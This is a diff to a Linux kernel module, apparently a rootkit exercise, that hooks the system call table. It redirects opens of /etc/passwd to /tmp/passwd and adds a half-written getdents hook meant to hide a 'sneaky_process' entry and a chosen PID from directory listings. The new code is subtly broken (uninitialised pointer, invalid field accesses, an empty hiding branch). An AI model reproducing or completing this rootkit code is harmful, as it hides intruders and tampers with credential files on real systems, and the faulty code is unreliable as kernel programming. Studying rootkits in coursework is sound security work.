@@ -14,6 +14,9 @@
 //This is a pointer to the system call table
 static unsigned long *sys_call_table;
 
+char * sneaky_pid = "";
+module_param(sneaky_pid, charp, 0);
+
 // Helper functions, turn on and off the PTE address protection mode
 // for syscall_table pointer
 int enable_page_rw(void *ptr) {
@@ -45,15 +48,33 @@ asmlinkage int sneaky_sys_openat(struct pt_regs *regs) {
     if (strnstr((char *)regs->si, "/etc/passwd", strlen("/etc/passwd")) != NULL) {
         copy_to_user((void *)regs->si, "/tmp/passwd", strlen("/tmp/passwd"));
     }
-
     return (*original_openat)(regs);
 }
 
+// int getdents(unsigned int fd, struct linux_dirent *dirp, unsigned int count);
+// DI, SI, DX
 asmlinkage int sneaky_sys_getdents(struct pt_regs *regs) {
+    struct linux_dirent *d;
+    int nread = original_getdents(regs->di, regs->si, regs->dx);
+
+    if (nread == -1) {
+        return -1;
+    }
+    if (nread == 0) {
+        return 0;
+    }
+
+    for (int bpos = 0; bpos < nread;) {
+        d = (struct linux_dirent *) (d->si + bpos);
+        if (strcmp(d->si->d_name, "sneaky_process") == 0 || strcmp(d->si->d_name, sneaky_pid) == 0) {
+
+        }
+
+        bpos += d->d_reclen;
+    }
 
 
-
-    return (*original_getdents)(regs);
+    return nread;
 }
 
 asmlinkage ssize_t sneaky_sys_read(struct pt_regs *regs) {
